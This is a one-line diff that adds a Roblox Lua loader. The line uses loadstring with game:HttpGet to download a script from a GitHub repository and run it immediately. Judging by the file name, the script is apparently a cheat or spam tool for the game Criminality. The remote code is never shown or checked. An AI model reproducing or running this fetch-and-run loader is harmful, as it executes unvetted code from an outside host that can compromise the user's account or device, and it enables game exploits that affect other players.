@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/spectershapecabin/loaders/main/loaders/criminality-spam7-ez71hx51gwjb2b.lua"))()
